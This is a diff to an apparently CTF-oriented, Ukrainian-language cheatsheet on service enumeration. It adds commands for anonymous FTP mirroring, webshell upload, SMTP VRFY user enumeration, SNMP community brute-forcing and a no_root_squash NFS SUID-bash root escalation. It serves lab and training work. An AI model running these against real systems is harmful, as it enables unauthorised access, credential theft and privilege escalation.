@@ -8,9 +8,15 @@
 
 ## <a id="ftp"></a>FTP (21)
 ```bash
-nmap -p21 --script ftp-anon,ftp-syst $TARGET
-ftp $TARGET            # login: anonymous / anonymous  (пароль — будь-що)
-# ls -la ; get <file> ; binary ; mget *
+nmap -p21 --script ftp-anon,ftp-syst $TARGET          # анонімний доступ?
+# завантажити ВСЕ анонімно одним рухом (дзеркало):
+wget -m --no-passive ftp://anonymous:anonymous@$TARGET/   # або -m ftp://... якщо passive
+# вручну:
+ftp $TARGET                                            # anonymous / anonymous
+#   binary ; prompt off ; mget *          -- забрати все
+#   get config.php ; get backup.zip        -- конкретні файли
+# залити webshell (якщо є запис і FTP = веб-корінь):
+#   put shell.php                          -- далі http://$TARGET/shell.php?c=id
 ```
 Цікаве: анонімний вхід, завантажувані конфіги/бекапи/ключі, права на upload (→ webshell, якщо FTP=веб-корінь). Зразки прапорців: `ftp_an0n_r3adm3`, `ftp_h1dd3n_d0tf1l3`.
 
@@ -46,13 +52,37 @@ mongosh --host $TARGET                       # MongoDB 27017: show dbs; use <db>
 Усередині БД: `SHOW DATABASES; USE x; SHOW TABLES; SELECT * FROM users;` — креди, нотатки, **прапорці** (зразки `sql_r0w_b1ll1ng`, `sql1_un10n_dump`).
 → повний enum/дамп/файли/RCE по рушіях (MySQL/Postgres/MSSQL/Redis/Mongo): [databases cheatsheet](../03-cheatsheets/databases.md).
 
-## Інші
-| Порт | Сервіс | Швидка дія |
-|---|---|---|
-| 25/110/143 | SMTP/POP3/IMAP | banner, VRFY юзери; читати пошту з кредами |
-| 161 UDP | SNMP | `snmpwalk -v2c -c public $TARGET` |
-| 2049 | NFS | `showmount -e $TARGET`; mount шару |
-| 3000/5000/8000/8080 | app | це веб → [web-enum](web-enum.md) |
+## SMTP / POP3 / IMAP (25 / 110 / 143)
+```bash
+nc -nv $TARGET 25                                   # banner
+# перебір юзерів через VRFY (валідні юзери → spraying/SSH):
+for u in root admin www-data test backup; do echo "VRFY $u" | nc -w1 $TARGET 25; done
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $TARGET
+# читати пошту з кредами (POP3):
+nc -nv $TARGET 110      #  USER bob  /  PASS pass  /  LIST  /  RETR 1
+```
+
+## SNMP (161/UDP) — часто витік конфігів/процесів
+```bash
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $TARGET   # підібрати community
+snmpwalk -v2c -c public $TARGET                                       # усе дерево (community 'public')
+snmp-check $TARGET -c public                                         # зведено (юзери/процеси/мережа)
+snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2               # процеси (паролі в cmdline!)
+snmpwalk -v2c -c public $TARGET 1.3.6.1.4.1.77.1.2.25               # Windows-юзери
+```
+
+## NFS (2049)
+```bash
+showmount -e $TARGET                                 # експортовані шари
+sudo mkdir -p /mnt/nfs && sudo mount -t nfs $TARGET:/export /mnt/nfs -o nolock
+ls -la /mnt/nfs                                      # читати файли/прапорці/ключі
+# no_root_squash → створити SUID-бінар локально від root і запустити на цілі:
+#   (локально root) cp /bin/bash /mnt/nfs/b; chmod +s /mnt/nfs/b
+#   (на цілі)        /export/b -p
+```
+
+## Веб-порти (3000/5000/8000/8080…)
+Це веб-додаток → [web-enum](web-enum.md).
 
 ## Загальний принцип
 Для кожного сервісу: (1) banner/версія → `searchsploit`; (2) anon/default creds; (3) читабельні файли/дані; (4) список юзерів для перевірки кредів деінде.
